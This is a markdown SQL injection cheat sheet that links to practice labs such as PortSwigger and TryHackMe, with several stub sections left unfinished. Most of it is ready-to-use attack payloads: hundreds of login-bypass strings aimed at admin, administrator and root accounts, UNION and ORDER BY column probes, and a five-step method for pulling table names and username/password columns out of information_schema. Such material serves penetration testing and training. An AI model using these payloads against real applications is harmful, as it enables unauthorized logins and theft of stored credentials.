# Resources [FREE]
- [Learn about SQL injection](https://portswigger.net/web-security/sql-injection)
- [SQLinjection Video Tutorial](https://www.youtube.com/watch?v=C-FiImhUviM&ab_channel=S4viOnLive%28BackupDirectosdeTwitch%29)
- [Learn and practice SQLi](https://tryhackme.com/room/sqlilab)
- [Practice SQLi on Portswigger](https://portswigger.net/web-security/all-labs#sql-injection)
- [Pracice SQLi on bWAPP](http://www.itsecgames.com/)

# SQL injection Basic Work Flow 
- WORKFLOW HERE

# Payloads

## Generate an error on the server

## Retriving hidden data
```sql
' or 1=1 -- -
' or 1=1-- -
' or 1=1--
' OR '1'='1
' OR '1'='1' --
' --

```
- [Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

## Login bypassing
Note: Remember, sometimes you have to repleace 'admin' for another username. Here, 'admin' is just an example.
```sql
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
admin' or 2 LIKE 2--
admin' or 2 LIKE 2#
admin') or 2 LIKE 2#
admin') or 2 LIKE 2--
admin') or ('2' LIKE '2
admin') or ('2' LIKE '2'#
admin') or ('2' LIKE '2'/*
admin') or 1=1 -- -
admin' or '1'='1
admin' or 1=1 -- -
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin';-- azer 
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
administrator' --
administrator' -- -
administrator' #
administrator'/*
administrator' or '2' LIKE '1
administrator' or 2 LIKE 2--
administrator' or 2 LIKE 2#
administrator') or 2 LIKE 2#
administrator') or 2 LIKE 2--
administrator') or ('2' LIKE '2
administrator') or ('2' LIKE '2'#
administrator') or ('2' LIKE '2'/*
administrator') or 1=1 -- -
administrator' or '1'='1
administrator' or 1=1 -- -
administrator' or '1'='1'--
administrator' or '1'='1'#
administrator' or '1'='1'/*
administrator'or 1=1 or ''='
administrator' or 1=1
administrator' or 1=1--
administrator' or 1=1#
administrator' or 1=1/*
administrator') or ('1'='1
administrator') or ('1'='1'--
administrator') or ('1'='1'#
administrator') or ('1'='1'/*
administrator') or '1'='1
administrator') or '1'='1'--
administrator') or '1'='1'#
administrator') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'administrator', '81dc9bdb52d04dc20036dbd8313ed055
administrator" --
administrator';-- azer
administrator" #
administrator"/*
administrator" or "1"="1
administrator" or "1"="1"--
administrator" or "1"="1"#
administrator" or "1"="1"/*
administrator"or 1=1 or ""="
administrator" or 1=1
administrator" or 1=1--
administrator" or 1=1#
administrator" or 1=1/*
administrator") or ("1"="1
administrator") or ("1"="1"--
administrator") or ("1"="1"#
administrator") or ("1"="1"/*
administrator") or "1"="1
administrator") or "1"="1"--
administrator") or "1"="1"#
administrator") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "administrator", "81dc9bdb52d04dc20036dbd8313ed055
root" #
root" --
root" or "1"="1
root" or "1"="1"#
root" or "1"="1"--
root" or "1"="1"/*
root" or 1=1
root" or 1=1 or ""="
root" or 1=1#
root" or 1=1--
root" or 1=1/*
root") or "1"="1
root") or "1"="1"#
root") or "1"="1"--
root") or "1"="1"/*
root") or ("1"="1
root") or ("1"="1"#
root") or ("1"="1"--
root") or ("1"="1"/*
root"/*
root' #
root' --
root' or '1'='1
root' or '1'='1'#
root' or '1'='1'--
root' or '1'='1'/*
root' or 1=1
root' or 1=1#
root' or 1=1--
root' or 1=1/*
root') or '1'='1
root') or '1'='1'#
root') or '1'='1'--
root') or '1'='1'/*
root') or ('1'='1
root') or ('1'='1'#
root') or ('1'='1'--
root') or ('1'='1'/*
root'/*
root'or 1=1 or ''='
```
- [How to bypass login authentication (Article)](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)
- [Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

## Determining the number of columns returned by the query with UNION SELECT NULL-- -
```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
etc...
```
## Determining the number of columns returned by the query with UNION SELECT NULL--
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
etc...
```
## Determining the number of columns returned by the query with ORDER BY--
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
' ORDER BY 5--
' ORDER BY 6--
' ORDER BY 7--
' ORDER BY 8--
' ORDER BY 9--
' ORDER BY 10--
' ORDER BY 11--
' ORDER BY 12--
etc...
```
## Determining the number of columns returned by the query with ORDER BY-- -
```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' ORDER BY 4-- -
' ORDER BY 5-- -
' ORDER BY 6-- -
' ORDER BY 7-- -
' ORDER BY 8-- -
' ORDER BY 9-- -
' ORDER BY 10-- -
' ORDER BY 11-- -
' ORDER BY 12-- -
etc...
```
- [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)

## Finding columns with a useful data type
```sql
' UNION SELECT 'test',NULL,NULL,NULL,NULL,NULL--
' UNION SELECT NULL,'test',NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,'test',NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,'test',NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,'test',NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL,'test'--
```

- [Practice this payload here](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)

## Listing the database contents on non-Oracle databases (Method 1)
1. Determinate the name of the databases
```sql
' UNION SELECT database()--
``` 
2. Determinate the number of columns usion UNION SELECT or ORDER BY
```sql
' UNION SELECT 'abc','def'--
' ORDER BY 2-- -
```
3. Determinate the tables into the database
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
``` 
4. Determinate the columns stored into tables
```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
```
5. Once we have the information of the columns, we dump the information
```sql
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
```
## Listing the database contents on non-Oracle databases (Method 2)
- [Practice this payload here](https://youtu.be/-haHnsBAPb8?t=638)
